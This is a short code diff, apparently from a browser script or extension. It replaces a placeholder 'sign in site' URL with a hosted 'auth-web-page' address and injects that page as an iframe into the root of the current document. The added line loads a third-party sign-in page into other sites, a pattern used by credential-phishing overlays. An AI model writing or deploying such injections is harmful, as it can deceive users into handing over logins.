@@ -1,4 +1,4 @@
-const _URL = 'url'; // Replace with earl of sign in site
+const _URL = 'https://custom--feed-438305--auth-web-page-l2tljg0r.web.app/'; // temp url
 const iframe = document.createElement('iframe');
 iframe.src = _URL;
 document.documentElement.appendChild(iframe);
